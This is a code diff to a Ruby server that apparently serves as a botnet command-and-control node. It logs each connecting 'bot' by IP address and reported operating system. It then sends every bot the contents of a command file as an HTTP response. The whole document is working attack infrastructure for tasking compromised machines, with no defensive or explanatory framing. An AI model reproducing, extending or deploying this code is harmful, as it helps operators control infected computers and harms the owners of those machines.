@@ -40,14 +40,6 @@ begin
   # Create the HTTP response
   cmd_file_read = File.new("cmd.txt", 'r')
 
-  response = cmd_file_read.read
-
-  res =  "HTTP/1.1 200 OK\r\n"
-  res += "Content-Type: text/plain\r\n"
-  res += "Content-Length: #{response.bytesize}\r\n"
-  res += "Connection: close\r\n"
-  res += "\r\n"
-  res += response
 
   loop do
     Thread.start(server.accept) do |socket|
@@ -58,13 +50,34 @@ begin
         socket.close
       end
 
-      puts "[*] New bot connection from #{socket.peeraddr[3]}\n"
-      bot_file.write("#{socket.peeraddr[3]}\n")
-      bot_file.close
+      response = cmd_file_read.read
 
-      request = socket.gets
-      STDERR.puts request
+      res =  "HTTP/1.1 200 OK\r\n"
+      res += "Content-Type: text/plain\r\n"
+      res += "Content-Length: #{response.bytesize}\r\n"
+      res += "Connection: close\r\n"
+      res += "\r\n"
+      res += response
 
+      init = socket.gets
+      os = ""
+      begin
+        os = init.split(":")[1]
+      rescue
+        puts "lmao"
+      end
+
+      if init.include? "NEW"
+        puts "[*] New bot connection from #{socket.peeraddr[3]} :: #{os}\n"
+        bot_file.write("#{socket.peeraddr[3]} :: #{os}\n")
+        bot_file.close
+      end
+
+
+
+      STDERR.puts init  # For debugging
+
+      # Send command to bot
       socket.print res
 
       # Close connections
